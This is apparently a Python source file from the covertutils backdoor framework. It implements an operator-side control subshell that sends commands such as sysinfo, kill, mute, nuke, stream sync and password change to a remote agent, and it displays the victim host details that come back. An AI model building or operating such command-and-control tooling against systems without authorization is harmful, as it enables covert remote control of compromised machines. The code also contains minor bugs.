import json
# from covertutils.payloads.generic.control import Commands as control_commands
from covertutils.shells.subshells import SimpleSubShell

Commands = {
	'reset' : 'R',
	'identity' : 'ID',
	'sysinfo' : 'SI',
	'kill' : 'KI',
	'mute' : 'MU',
	'unmute' : 'UM',
	'nuke' : 'NK',
	'check_sync' : 'CS',
	'sync' : 'Y',
	'chpasswd' : 'PWD',
	}


def message_handle(message, instance) :

	if instance.sync_stream :
		if message == 'OK' :
			instance.handler.getOrchestrator().reset([instance.sync_stream])

	if instance.chpasswd :
		if message == 'OK' :
			instance.handler.getOrchestrator().initCrypto(instance.chpasswd)
			instance.chpasswd = None

	if instance.sysinfo :
		# sysinfo_var = message
		# sysinfo = json.loads(message)
		sysinfo = message.split('+')
		instance.message_logger.warn( """
General:
	Host: {}
	Machine: {}
	Version: {}
	Locale: {}
	Platform: {}
	Release: {}
	System: {}
	Processor: {}
	User: {}

Specifics:
	Windows: {}
	Linux: {}

		""".format( *sysinfo ) )
# 	MacOS: {}
		instance.base_shell.sysinfo = sysinfo
		instance.sysinfo = False

	elif instance.check_sync :
		local_dict = {}
		orch = instance.handler.getOrchestrator()
		for stream in orch.getStreams() :
			local_dict[stream] = orch.getKeyCycles(stream)
		remote_dict = json.loads(message)

		output = ''
		for stream in remote_dict :
			if stream not in local_dict :
				self.debug_logger.warn("Stream '%s' exists only in the Agent")
				# if local decryption key matches the remote encryption and vise-versa
			encryption_sync = local_dict[stream][0] == remote_dict[stream][1]
			decryption_sync = local_dict[stream][1] == remote_dict[stream][0]
			synced = encryption_sync and decryption_sync
			if synced :
				output += "[+] Stream '%s' is synchronized at %d - %d cycles\n" % ( stream, local_dict[stream][0], local_dict[stream][1] )
			else :
				output += "[-] Stream '%s' is out-of-sync at '%s' channel\n" % ( stream, "Encryption" if encryption_sync else "Decryption" )
				# if instance.sync :

		instance.message_logger.warn(output)
		# print "local: " + json.dumps(local_dict)
		# print "remote: " + message
		instance.check_sync = False

	else :
		instance.message_logger.warn( message )


class ControlSubShell ( SimpleSubShell ) :

	def __init__( self, stream, handler, queue_dict, base_shell, ignore_messages = set(['X']), prompt_templ = " (>{stream}<) |-> ") :
		SimpleSubShell.__init__( self, stream, handler, queue_dict, base_shell, ignore_messages, prompt_templ )
		self.updatePrompt( )
		self.message_function = message_handle
		self.sysinfo = False
		self.check_sync = False
		self.killed = False
		self.sync_stream = False
		self.chpasswd = False

	def default( self, line ) :

		comm, args, line = self.parseline(line)
		try :
			command = Commands[comm]
		except :
			self.debug_logger.warn( "No such control command [%s]!" % comm)
			return

		if command == Commands['sync'] :
			if len(args) == 0 :
				self.debug_logger.warn( "No Stream selected!")
				return
			stream = args
			if stream not in self.handler.getOrchestrator().getStreams() :
				self.debug_logger.warn( "Stream '%s' does not exist!" % stream)
				return
			self.sync_stream = stream
			command = "%s %s" % (command, stream)

		if command == Commands['chpasswd'] :
			if len(args) == 0 :
				self.debug_logger.warn( "No Password selected!")
				return
			new_passwd = args
			self.chpasswd = new_passwd
			# new_passwd = '1234'
			command = "%s %s" % (command, new_passwd)


		if command == Commands['reset'] :
			self.debug_logger.warn( "Reseting handler" )
			self.resetHandler()

		if command == Commands['sysinfo'] :
			self.sysinfo = True

		if command == Commands['kill'] :
			self.killed = True

		self.debug_logger.warn( "Sending '%s' control command!" % command )
		self.handler.preferred_send( command, self.stream )

		if self.chpasswd :
			self.handler.getOrchestrator().initCrypto(self.chpasswd)
			self.chpasswd = None

		if command == Commands['check_sync'] :
			self.check_sync = True


	def resetHandler( self ) :
		self.handler.reset()


	def completenames( self, text, line, begidx, endidx ) :
		# print "RUN"
		comm, args, line = self.parseline(line)
		# print "pasrsed"
		complete_list = []
		probable_comm = comm
		# print probable_comm
		if probable_comm in Commands.keys() :
			return []

		for known_command in Commands.keys() :
			if known_command.startswith(probable_comm) :

				complete_list.append( known_command )

		return complete_list

	def do_help( self, line ) :
		commands = Commands.keys()
		print commands
